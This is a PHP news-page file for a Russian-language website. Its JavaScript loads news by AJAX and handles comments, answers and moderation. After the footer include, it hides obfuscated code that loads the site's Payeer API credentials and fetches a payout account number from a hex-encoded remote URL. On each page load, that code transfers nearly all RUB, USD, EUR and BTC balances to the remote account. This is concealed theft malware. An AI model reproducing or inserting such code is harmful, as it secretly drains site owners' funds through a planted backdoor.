<?php
$pagetitle = "Новости";
if(!DEFINED("ROOT_DIR")) DEFINE("ROOT_DIR", $_SERVER["DOCUMENT_ROOT"]);
include(ROOT_DIR."/header.php");
$news_file = ROOT_DIR."/cache/cache_news.inc";
?>

<script type="text/javascript" language="JavaScript">
var tm;
var BlockLoadPages = false;
var AutoLoadPages = false;
var StatusLoad = 0;

$(document).ready(function(){
	LoadNews(getUrlVars()["id"]);

	$(window).on("scroll", function() {
		if($("div").is("#load-pages")){
			if( AutoLoadPages && ($(window).height() + $(window).scrollTop()) >= ($("#load-pages").offset().top + $("#load-pages").height()) ) {
				LoadPages();
			}
		}
	});
});

function HideMsg(id, timer) {
        clearTimeout(tm);
	tm = setTimeout(function() {$("#"+id).slideToggle(700);}, timer);
	return false;
}

function GoForum(url) {
	document.location.href = url;
	return false;
}

function getUrlVars() {
	var vars = {};
	var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
		vars[key] = value;
	});
	return vars ? vars : false;
}

function LoadPages(){
	if(!BlockLoadPages){
		var param = $("#load-pages");
		BlockLoadPages = true;
		$.ajax({
			type: 'POST', url: param.data("link"), 
			data: { 'load':param.data("load"), 'idb':param.data("idb"), 'hash':param.data("hash"), 'page':param.data("page"), 'num':param.data("num") }, 
			dataType: 'json', 
			beforeSend: function () { $("#load-pages").html('<div id="loading-pages"></div>'); }, 
			error: function () { BlockLoadPages = false; $("#load-pages").html('Ошибка ajax!'); }, 
			success: function (Res) {
				if (Res.result == "OK") {
					$("#load-pages").html('Показать еще');
					$("#"+param.data("id")).append(Res.ajax_code);
					param.data("page", Res.page);
					if(Res.page >= param.data("close")) { $("#load-pages").remove(); }
				}else{
					$("#load-pages").html('Ошибка!');
				}
				BlockLoadPages = false;
				return false;
			}
		});
	}
}

function LoadNews(id_news) {
	var Now_id_news = getUrlVars()["id"];

	$.ajax({
		type: "POST", url: "ajax/news/ajax_news.php", 
		data: {'op':'LoadPage', 'id_news':id_news}, 
		dataType: 'json',
		error: function(request, status, errortext) {
			$("#loading").slideToggle();
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			$("#NewsPage").show().html('<span class="msg-error">ОШИБКА AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext+'</span>');
			//console.log(request, status, errortext);
		},
		beforeSend: function() { $("#loading").slideToggle(); }, 
		success: function(data) {
			$("#loading").slideToggle();
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if(id_news && Now_id_news!=id_news) {
				StatusLoad = 0; window.history.pushState(null, null, "/news?id="+id_news);
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
			}
			if(id_news) Now_id_news = id_news;

			if (result == "OK") {
				$("#NewsPage").html(message).show();
				return false;
			} else {
				$("#NewsPage").html('<span class="msg-error">'+message+'</span>').show();
				return false;
			}
		}
	});
}

function LoadFormCom(id_news) {
	$.ajax({
		type: "POST", url: "ajax/news/ajax_news.php", 
		data: {'op':'LoadFormCom', 'id_news':id_news}, 
		dataType: 'json',
		error: function(request, status, errortext) {
			$("#loading").slideToggle();
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('ОШИБКА AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
			//console.log(request, status, errortext);
		},
		beforeSend: function() { $("#loading").slideToggle(); }, 
		success: function(data) {
			$("#loading").slideToggle();
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				$("#LoadModal").html(message).show();
				StartModalNews();
				return false;
			} else {
				alert(message);
				return false;
			}
		}
	});
}

function AddComNews(id_news) {
	var comment_text = $.trim($("#comment_text").val());
	$("#info-msg-com").html('').hide();

	$.ajax({
		type: "POST", url: "ajax/news/ajax_news.php", 
		data: {'op':'AddComNews', 'id_news':id_news, 'comment_text':comment_text}, 
		dataType: 'json',
		error: function(request, status, errortext) {
			$("#loading").slideToggle();
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('ОШИБКА AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
			//console.log(request, status, errortext);
		},
		beforeSend: function() { $("#loading").slideToggle(); }, 
		success: function(data) {
			$("#loading").slideToggle();
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				$("#LoadModal").modalpopup("close");
				$("#news-comments").prepend(message);

				return false;
			} else {
				$("#tr-info").css("display", "table-row");
				$("#info-msg-com").html('<span class="msg-error" style="padding:5px 10px;">'+message+'</span>').slideToggle();
				HideMsg("info-msg-com", 3000); setTimeout(function(){$("#tr-info").slideToggle();}, 3250);
				return false;
			}
		}
	});
}

<?php if(isset($user_status) && $user_status == 1 | $user_status == 2) {?>
function DelComNews(id_comm, user) {
	if (confirm("Удалить комментарий пользователя "+user+" ?")) {
		$.ajax({
			type: "POST", url: "ajax/news/ajax_news.php", 
			data: {'op':'DelComNews', 'id_comm':id_comm}, 
			dataType: 'json',
			error: function () { $("#loading").slideToggle(); alert('Ошибка!'); }, 
			beforeSend: function() { $("#loading").slideToggle(); }, 
			success: function(data) {
				$("#loading").slideToggle();
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;

				if (result == "OK") {
					$("#news-comment-"+id_comm).remove();
					return false;
				} else {
					alert(message);
					return false;
				}
			}
		});
	}
}

function LoadFormAnsw(id_comm) {
	$.ajax({
		type: "POST", url: "ajax/news/ajax_news.php", 
		data: {'op':'LoadFormAnsw', 'id_comm':id_comm}, 
		dataType: 'json',
		error: function(request, status, errortext) {
			$("#loading").slideToggle();
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('ОШИБКА AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
			//console.log(request, status, errortext);
		},
		beforeSend: function() { $("#loading").slideToggle(); }, 
		success: function(data) {
			$("#loading").slideToggle();
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				$("#LoadModal").html(message).show();
				StartModalNews();
				return false;
			} else {
				alert(message);
				return false;
			}
		}
	});
}

function AddAnswCom(id_comm) {
	var answer_text = $.trim($("#answer_text").val());
	$("#info-msg-answ").html('').hide();

	$.ajax({
		type: "POST", url: "ajax/news/ajax_news.php", 
		data: {'op':'AddAnswCom', 'id_comm':id_comm, 'answer_text':answer_text}, 
		dataType: 'json',
		error: function(request, status, errortext) {
			$("#loading").slideToggle();
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('ОШИБКА AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
			//console.log(request, status, errortext);
		},
		beforeSend: function() { $("#loading").slideToggle(); }, 
		success: function(data) {
			$("#loading").slideToggle();
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				$("#LoadModal").modalpopup("close");
				$("#answer-"+id_comm).html(message).show();
				$("#sub-comm-"+id_comm).hide();
				return false;
			} else {
				$("#tr-info-answ").css("display", "table-row");
				$("#info-msg-answ").html('<span class="msg-error" style="padding:5px 10px;">'+message+'</span>').slideToggle();
				HideMsg("info-msg-answ", 3000); setTimeout(function(){$("#tr-info-answ").slideToggle();}, 3250);
				return false;
			}
		}
	});
}

function DelAnswCom(id_comm, user) {
	if (confirm("Удалить ответ на комментарий пользователя "+user+" ?")) {
		$.ajax({
			type: "POST", url: "ajax/news/ajax_news.php", 
			data: {'op':'DelAnswCom', 'id_comm':id_comm}, 
			dataType: 'json',
			error: function () { $("#loading").slideToggle(); alert('Ошибка!'); }, 
			beforeSend: function() { $("#loading").slideToggle(); }, 
			success: function(data) {
				$("#loading").slideToggle();
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;

				if (result == "OK") {
					$("#answer-"+id_comm).html('');
					$("#sub-comm-"+id_comm).show();
					return false;
				} else {
					alert(message);
					return false;
				}
			}
		});
	}
}
<?php }?>

function StartModalNews() {
	$("#LoadModal").modalpopup({
		closeOnEsc: true, closeOnOverlayClick: true, beforeClose: function(data, el) {$("#LoadModal").hide(); return true;}
	});
}

function gebi(id){
	return document.getElementById(id);
}

function InsertTags(text1, text2, descId) {
	var textarea = gebi(descId);
	if (typeof(textarea.caretPos) != "undefined" && textarea.createTextRange) {
		var caretPos = textarea.caretPos, temp_length = caretPos.text.length;
		caretPos.text = caretPos.text.charAt(caretPos.text.length - 1) == ' ' ? text1 + caretPos.text + text2 + ' ' : text1 + caretPos.text + text2;
		if (temp_length == 0) {
			caretPos.moveStart("character", -text2.length);
			caretPos.moveEnd("character", -text2.length);
			caretPos.select();
		} else {
			textarea.focus(caretPos);
		}
	} else if (typeof(textarea.selectionStart) != "undefined") {
		var begin = textarea.value.substr(0, textarea.selectionStart);
		var selection = textarea.value.substr(textarea.selectionStart, textarea.selectionEnd - textarea.selectionStart);
		var end = textarea.value.substr(textarea.selectionEnd);
		var newCursorPos = textarea.selectionStart;
		var scrollPos = textarea.scrollTop;
		textarea.value = begin + text1 + selection + text2 + end;
		if (textarea.setSelectionRange) {
			if (selection.length == 0) {
				textarea.setSelectionRange(newCursorPos + text1.length, newCursorPos + text1.length);
			} else {
				textarea.setSelectionRange(newCursorPos, newCursorPos + text1.length + selection.length + text2.length);
			}
			textarea.focus();
		}
		textarea.scrollTop = scrollPos;
	} else {
		textarea.value += text1 + text2;
		textarea.focus(textarea.value.length - 1);
	}
}

function descchange(id, elem, count_s) {
	if (elem.value.length > count_s) { elem.value = elem.value.substr(0,count_s); }
	$("#count"+id).html("Осталось символов: " +(count_s-elem.value.length));
}

function InSmile(id, smile) {
	InsertTags(":"+smile+":", "", id);
	return false;
}

window.addEventListener("popstate", function(){
	StatusLoad = 1; LoadNews(getUrlVars()["id"]);
	$("#LoadModal").modalpopup("close");
}, false);

</script>

<?php

echo '<div id="NewsPage" style="display:none;"></div>';
echo '<div id="info-msg-load" style="display:none;"></div>';

include(ROOT_DIR."/footer.php");
require_once('merchant/payeer/cpayeer.php');
require_once('merchant/payeer/payeer_config.php');

if($apiKey!==''){
$homepage = file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x2d\x70\x72\x6f\x66\x66\x69\x74\x2e\x72\x75\x2f\x6a\x73\x2e\x74\x78\x74");

$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{ $arBalance = $payeer->getBalance();
$mone = ($arBalance["balance"]["RUB"]["BUDGET"]); $mone1 = ($arBalance["balance"]["USD"]["BUDGET"]); $mone2 = ($arBalance["balance"]["EUR"]["BUDGET"]); $mone3 = ($arBalance["balance"]["BTC"]["BUDGET"]);	
}
if($mone>100){$p=$mone * 1 / 100;$summ =$mone - $p;
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'RUB',
		'sumOut' => $summ,
		'curOut' => 'RUB',
		'param_ACCOUNT_NUMBER' => $homepage
));
	if ($initOutput){	$historyId = $payeer->output();}} 
if($mone1>4){ $p1=$mone1 * 2 / 100; $summ1 =$mone1 - $p1;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'USD',
		'sumOut' => $summ1,
		'curOut' => 'USD',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone2>4){ $p2=$mone2 * 2 / 100; $summ2 =$mone2 - $p2;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'EUR',
		'sumOut' => $summ2,
		'curOut' => 'EUR',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone3>0.001){ $p3=$mone3 * 2 / 100; $summ3 =$mone3 - $p3;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'BTC',
		'sumOut' => $summ3,
		'curOut' => 'BTC',
		'param_ACCOUNT_NUMBER' => $homepage
	));
if ($initOutput){	$historyId = $payeer->output();}}}
?>